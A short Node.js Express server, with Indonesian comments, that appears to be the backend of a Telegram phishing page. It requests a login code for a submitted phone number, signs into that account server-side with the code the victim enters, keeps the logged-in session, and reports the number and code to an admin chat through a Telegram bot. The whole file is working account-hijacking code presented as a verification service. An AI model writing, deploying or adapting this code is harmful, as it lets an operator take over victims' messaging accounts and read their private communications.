// server.js
require('dotenv').config();
const express = require('express');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const cors = require('cors');

const app = express();
const port = 3000;

// Config
const API_ID = parseInt(process.env.TELEGRAM_API_ID);
const API_HASH = process.env.TELEGRAM_API_HASH;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

// In-memory storage untuk phone_code_hash (gunakan database di production)
const sessions = {};

app.use(cors());
app.use(express.json());

// Endpoint untuk mengirim kode verifikasi
app.post('/send-code', async (req, res) => {
  try {
    const phoneNumber = req.body.phoneNumber;
    const client = new TelegramClient(
      new StringSession(''), 
      API_ID, 
      API_HASH, 
      { connectionRetries: 5 }
    );

    await client.connect();
    const { phoneCodeHash } = await client.sendCode({
      apiId: API_ID,
      apiHash: API_HASH,
      phoneNumber,
    });

    // Simpan phone_code_hash
    sessions[phoneNumber] = { phoneCodeHash, client };
    
    res.status(200).json({ 
      success: true,
      message: 'Kode verifikasi telah dikirim via SMS/Telegram'
    });

  } catch (error) {
    console.error('Error sending code:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint untuk verifikasi kode
app.post('/verify-code', async (req, res) => {
  try {
    const { phoneNumber, code } = req.body;
    const session = sessions[phoneNumber];

    if (!session) {
      throw new Error('Sesi tidak ditemukan');
    }

    // Verifikasi kode
    await session.client.signIn({
      phoneNumber,
      phoneCodeHash: session.phoneCodeHash,
      phoneCode: code,
    });

    // Kirim notifikasi ke bot
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.ADMIN_CHAT_ID,
        text: `✅ Kode ${code} berhasil diverifikasi untuk nomor ${phoneNumber}`
      })
    });

    res.status(200).json({ 
      success: true,
      message: 'Verifikasi berhasil!'
    });

  } catch (error) {
    console.error('Error verifying code:', error);
    res.status(400).json({ success: false, error: error.message });
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});